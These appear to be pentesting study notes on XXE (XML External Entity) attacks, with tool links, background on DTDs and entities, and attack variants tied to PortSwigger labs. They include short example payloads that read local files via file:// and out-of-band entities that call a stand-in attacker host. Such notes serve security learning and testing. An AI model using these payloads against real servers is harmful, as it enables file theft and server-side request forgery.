# XXE - XML External Entity Attacks

## Tools and Resources

* [PayloadsAllTheThings/XXEInjection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe)
* [XEE Payload collection](https://gist.github.com/staaldraad/01415b990939494879b4)
* [XXEinjector](https://github.com/enjoiz/XXEinjector) - XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications.
* [xxe-recursive-download](https://github.com/AonCyberLabs/xxe-recursive-download) - This tool exploits XXE to retrieve files from a target server. It obtains directory listings and recursively downloads file contents.
* [https://xapax.github.io/security/#attacking\_web\_applications/xml\_external\_entity\_attack/](https://xapax.github.io/security/#attacking\_web\_applications/xml\_external\_entity\_attack/)
* [https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html)
* [https://pentestbook.six2dez.com/enumeration/web/xxe](https://pentestbook.six2dez.com/enumeration/web/xxe)
* [**Comprehensive Guide on XXE Injection**](https://www.hackingarticles.in/comprehensive-guide-on-xxe-injection/)
* _XML External Entity Vulnerabilities - Bug Bounty Hunting Essentials, pg.143_

## How it works

### Basics

* **XML** - XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML"). But its popularity has now declined in favor of the JSON format.
* **XML Entities** - XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.
* **DTD: Document Type Definition** - The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.
*   **XML Custom Entities** -  XML allows custom entities to be defined within the DTD. For example:

    &#x20;`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

    &#x20;This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".
*   **XML External Entity** -  XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

    &#x20;The declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded. For example:

    &#x20;`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

    &#x20;The URL can use the `file://` protocol, and so external entities can be loaded from file. For example:

    &#x20;`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

### **Testing for XXE Vulnerabilities**

* Testing for [file retrieval](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files) by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
* Testing for [blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind) by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) is perfect for this purpose.
* Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an [XInclude attack](https://portswigger.net/web-security/xxe#xinclude-attacks) to try to retrieve a well-known operating system file.

## **Attacks**

### XXE for retrieving files

* You can retrieve an arbitrary file from a target filesystem by modifying a submitted XML in two ways:
  * Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
  * Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
* [https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

### XXE to perform SSRF

* To exploit an XXE vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf), you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform [blind SSRF](https://portswigger.net/web-security/ssrf/blind) attacks.
* [https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)

### Blind XXE attacks

* Many instances of XXE vulnerabilities are blind. This means that the application does not return the values of any defined external entities in its responses, and so direct retrieval of server-side files is not possible.
* Attack surface for XXE injection vulnerabilities is obvious in many cases, because the application's normal HTTP traffic includes requests that contain data in XML format. In other cases, the attack surface is less visible. However, if you look in the right places, you will find XXE attack surface in requests that do not contain any XML.
*   &#x20;You can often detect blind XXE using the same technique as for [XXE SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks) but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

    `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`

    * This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.
    * [https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

### XML Parameter entities

*   &#x20;Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

    `<!ENTITY % myparameterentity "my parameter entity value" >`

    &#x20;And second, parameter entities are referenced using the percent character instead of the usual ampersand:

    &#x20;`%myparameterentity;`

    &#x20;This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

    `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`
* [https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)

### Blind XXE for OOB Exfiltration

* involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.
* [https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

### Blind XXE to retrieve data via error messages

* An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response
* [https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

### Blind XXE via repurposing a local DTD

* It might be possible to trigger error messages containing sensitive data, due to a loophole in the XML language specification. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.
* [https://portswigger.net/research/top-10-web-hacking-techniques-of-2018#7](https://portswigger.net/research/top-10-web-hacking-techniques-of-2018#7)
* [https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
* [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)
* XInclude Attacks
  * Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. When you cannot submit this data via the `DOCTYPE` element, You can attempt to use the `XInclude` element, which allows XML documents to be built from sub-documents.
  * Placing your attack data in this element, allows your data to be placed in a server-side XML document
  * [https://portswigger.net/web-security/xxe/lab-xinclude-attack](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
* XXE via file upload
  * Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents.
  * [https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
* XXE via modified content type
  * Most POST requests use a default content type that is generated by HTML forms, such as `application/x-www-form-urlencoded`. Some web sites expect to receive requests in this format but will tolerate other content types, including XML.
  * If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.
